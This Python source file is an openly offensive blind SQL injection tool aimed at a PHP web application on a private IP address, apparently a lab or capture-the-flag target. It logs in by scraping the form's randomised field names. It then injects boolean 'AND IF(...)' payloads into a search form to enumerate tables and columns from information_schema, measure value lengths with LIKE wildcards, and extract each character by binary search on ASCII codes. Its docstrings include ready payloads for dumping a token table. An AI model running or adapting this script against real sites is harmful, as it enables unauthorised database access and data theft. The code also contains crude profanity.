import requests
import re
import time
from tabulate import tabulate
from bs4 import BeautifulSoup

URL_lenta = "http://10.0.4.12/lenta.php"
URL_index = "http://10.0.4.12/index.php"
login = ''
passwd = ''
add_params = {'enter.x': 0, 'enter.y': 0}
proxy = {'http': 'http://127.0.0.1:8080'}


def timer(method):
    def timed(*args, **kw):
        ts = time.time()
        result = method(*args, **kw)
        te = time.time()        
        print('%r  %2.2f ms' %(method.__name__, (te - ts) * 1000))
        return result    
    return timed


class Sqli():
    def __init__(self, cock):
        self.sqli_tmp_main = "day%' AND IF ({},True,False); -- -"
        self.sqli_tmp_asci = "Ascii(substring((SELECT {} FROM {} limit {},1),{},1)) = {}"
        self.sqli_tmp_asci_bin_search = "Ascii(substring((SELECT {} FROM {} limit {},1),{},1)) {} {}"
        self.sqli_tmp_notes_count = "(SELECT count({}) FROM {}) = {}"
        self.sqli_tmp_note_length = "(SELECT {} FROM {} limit {},1) LIKE '{}'"
        self.sqli_get_tables_name = {"select": "table_name", "from": "information_schema.tables where table_schema=database()"}
        self.sqli_get_columns_name = {"select": "column_name", "from": "information_schema.tables where table_name='{}'"}
        self.cock = cock
        if cock is None:
            res = requests.get(URL_index)
            secret = self._get_key(res.text)
            self.cock = res.cookies
            data = {secret[0]: login, secret[1]: passwd}
            # print(data)
            res_p = requests.post(URL_index, data = data, cookies = self.cock, proxies = proxy)

    def _get_key(self, page):
        soup = BeautifulSoup(page, 'lxml')
        secrets = soup.find_all('input')
        # print([i['name'] for i in secrets if i['name'] not in ('submit', 'enter', 'logoff')])
        return [i['name'] for i in secrets if i['name'] not in ('submit', 'enter', 'logoff')]

    def _check_condition(self, page):
        stop_word = "Not found"
        if stop_word not in page: return True
        else: return False

    def _make_huiquest(self, sql_query):
        res = requests.get(URL_lenta, cookies = self.cock, proxies = proxy)
        secret = self._get_key(res.text)
        data = {secret[0]: sql_query}
        res = requests.post(URL_lenta, data = data, cookies = self.cock, proxies = proxy)
        return res

    def get_notes_count(self, sql_row_, sql_table_):
        """
        Great q: 
        day%' and if ((select count(token) from token)=72,True, False); -- -
        """
        i = 0
        while True:
            query = self.sqli_tmp_main.format(self.sqli_tmp_notes_count.format(sql_row_, sql_table_, i))
            res = self._make_huiquest(query)
            if self._check_condition(res.text) is True:
                print(f"Table {sql_table_} contains {i} notes for {sql_row_} row ")
                return i
            i += 1

    def get_note_length(self, sql_row_, sql_table_, count_of_notes):
        """
        Great q: 
        day%' AND IF ('I' like '_',True,False); -- -
        where True AND IF ((select b.a from (SELECT c.id as a FROM `docs` c limit 0,1) b where b.a like '__'),True,False)
        day%' and if ((select count(token) from token) like '_',True, False); -- -
        day%' AND IF ((SELECT token FROM token limit 0,1) like '___________',True,False); -- -
        """
        notes_length = {}
        for i in range(0, count_of_notes):
            wildcard = '_'
            while True:
                query = self.sqli_tmp_main.format(self.sqli_tmp_note_length.format(sql_row_, sql_table_, i, wildcard))
                res = self._make_huiquest(query)
                if self._check_condition(res.text) is True:
                    print(f"{i+1} Note contains {len(wildcard)} chars")
                    notes_length.update({i: len(wildcard)})
                    break
                wildcard = wildcard + '_'
        # print(notes_length)
        return notes_length

    @timer
    def guess_notes(self, sql_row_, sql_table_, notes_length_):
        """
        Binary searching
        Great q:
        day%' and if (Ascii(substring((select token from token limit 1),1,1))=73,True,False); -- -
        """
        ascii_let = [i for i in range(32,127)]
        words = {}
        
        for note_num in notes_length_:
            final_word = ''
            for note_len in range(1, notes_length_[note_num] + 1):

                mid = len(ascii_let) // 2
                low = 0
                high = len(ascii_let) - 1
                while low <= high:
                    query = self.sqli_tmp_main.format(self.sqli_tmp_asci_bin_search.format(
                            sql_row_, sql_table_, note_num, note_len, '=',str(ascii_let[mid])))
                    res = self._make_huiquest(query)
                    if self._check_condition(res.text) is True:
                        final_word = final_word + chr(ascii_let[mid])
                        # print(final_word)
                        break
                    else:
                        query = self.sqli_tmp_main.format(self.sqli_tmp_asci_bin_search.format(
                                sql_row_, sql_table_, note_num, note_len, '>',str(ascii_let[mid])))
                        res = self._make_huiquest(query)
                        if self._check_condition(res.text) is True:
                            low = mid + 1
                        else:
                            high = mid - 1
                        mid = (low + high) // 2
            print(final_word)
            words.update({note_num: final_word})
        return words


    def maintance_act(self, sql_row, sql_table):
        notes_count = self.get_notes_count(sql_row, sql_table)
        note_length = self.get_note_length(sql_row, sql_table, notes_count)
        notes = self.guess_notes(sql_row, sql_table, note_length)
        return [notes_count, note_length, notes]

    def take_all_of_things(self):
        """
        final_table = {'table name': {'column name': [content]}}
        """
        dict_with_columns = {}
        sql_row = self.sqli_get_tables_name['select']
        sql_table = self.sqli_get_tables_name['from']
        tables = self.maintance_act(sql_row, sql_table)
        print(tables[2].values())
        for note in tables[2].values():
            sql_row = self.sqli_get_columns_name['select']
            sql_table = self.sqli_get_columns_name['from'].format(note)
            columns = self.maintance_act(sql_row, sql_table)
            for column in columns:
                dict_with_columns.update({note: {column: []}})
                print(dict_with_columns)
        
        # final_dict = {}
        # for table in dict_with_columns:
        #     for column in dict_with_columns[table]:
        #         content = self.maintance_act(column, table)

        #     print()




    def take_query(self):
        choice = input("Type 1 for write own query, or 2 for extracting all \n")
        if choice == '1':
            while True:
                sql_row = input("SELECT ")
                sql_table = input("FROM ")
                
                self.maintance_act(sql_row, sql_table)
        if choice == '2':
                self.take_all_of_things()
        else:
            print("fuckoff")
            exit(0)


if __name__ == "__main__":
    cookie = None
    a = Sqli(cookie)
    a.take_query()
